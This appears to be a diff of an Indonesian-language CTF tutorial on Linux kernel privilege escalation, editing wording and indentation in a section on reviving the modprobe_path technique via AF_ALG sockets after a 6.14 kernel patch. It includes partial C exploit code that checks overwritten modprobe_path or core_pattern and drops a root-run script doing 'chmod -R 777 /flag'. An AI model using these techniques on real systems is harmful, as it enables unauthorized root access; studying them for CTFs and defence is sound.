@@ -106,7 +106,7 @@ int main() {
 ### Kok gabisa?
 Kalo dicoba contoh yang diatas pada linux versi 6.14+, tidak bakal berhasil. Disebutkan pada [blog Theori](https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch), terdapat sebuah [patch](https://web.git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=fa1bdca98d74472dcdb79cb948b54f63b5886c04) yang menghapus pemanggilan modprobe yang sudah saya sebutkan sebelumnya.
 
-Blog Theori tersebut juga memberikan solusi. Di linux kernel, terdapat [_crypto_ API](https://www.kernel.org/doc/html/v4.11/crypto/userspace-if.html) yang dapatkan digunakan oleh user apapun. API ini dapat diakses dengan membuat socket dengan tipe AF_ALG. Ternyata, alur yang hampir sama dengan alur `binfmt_misc` terdapat pada sistem tersebut.
+Blog Theori tersebut juga memberikan solusi. Di linux kernel, terdapat [_crypto_ API](https://www.kernel.org/doc/html/v4.11/crypto/userspace-if.html) yang dapatkan digunakan oleh user apapun. API ini dapat diakses dengan membuat socket dengan tipe AF_ALG. Ternyata, alur yang hampir sama dengan alur `binfmt_misc` yang sudah disebutkan diatas.
 
 Ketika socket AF_ALG dibuat dengan `salg_type` (tipe algoritma kripto) yang asing, linux mengambil asumsi bahwa _mungkin_ terdapat sebuah kernel module yang mengerti tipe algoritma tersebut. Oleh karena itu, `modprobe` akan dipanggil, dan tentunya lokasinya akan diambil dari `modprobe_path`.
 
@@ -128,12 +128,12 @@ void fatal(const char *s) {
 }
 
 int check_modprobe_path() {
-	// Check if /proc/sys/kernel/modprobe_path has been overwritten
-	char buf[0x100] = {};
-	int core = open("/proc/sys/kernel/modprobe", O_RDONLY);
-	read(core, buf, sizeof(buf));
-	close(core);
-	return strncmp(buf, "/tmp/x", 0x6) == 0;
+    // Check if /proc/sys/kernel/modprobe_path has been overwritten
+    char buf[0x100] = {};
+    int core = open("/proc/sys/kernel/modprobe", O_RDONLY);
+    read(core, buf, sizeof(buf));
+    close(core);
+    return strncmp(buf, "/tmp/x", 0x6) == 0;
 }
 
 int main() {
@@ -144,7 +144,7 @@ int main() {
     if(!check_modprobe_path()) fatal("modprobe_path not ovewritten");
 
     // The command we want root to run
-	char *payload = "#!/bin/sh\nchmod -R 777 /flag\n";
+    char *payload = "#!/bin/sh\nchmod -R 777 /flag\n";
     int fd;
     fd = open("/tmp/x", O_RDWR | O_CREAT);
     if (fd < 0) fatal("cannot create file /tmp/x");
@@ -196,12 +196,12 @@ void fatal(const char *s) {
 
 
 int check_core_pattern() {
-	// Check if /proc/sys/kernel/core_pattern has been overwritten
-	char buf[0x100] = {};
-	int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
-	read(core, buf, sizeof(buf));
-	close(core);
-	return strncmp(buf, "|/tmp/x", 0x7) == 0; // The pipe `|` is important!
+    // Check if /proc/sys/kernel/core_pattern has been overwritten
+    char buf[0x100] = {};
+    int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
+    read(core, buf, sizeof(buf));
+    close(core);
+    return strncmp(buf, "|/tmp/x", 0x7) == 0; // The pipe `|` is important!
 }
 
 int main() {
@@ -212,7 +212,7 @@ int main() {
     if(!check_core_pattern()) fatal("core_pattern not ovewritten");
 
     // The command we want root to run
-	char *payload = "#!/bin/sh\nchmod -R 777 /flag\n";
+    char *payload = "#!/bin/sh\nchmod -R 777 /flag\n";
     int fd;
     fd = open("/tmp/x", O_RDWR | O_CREAT);
     if (fd < 0) fatal("cannot create file /tmp/x");
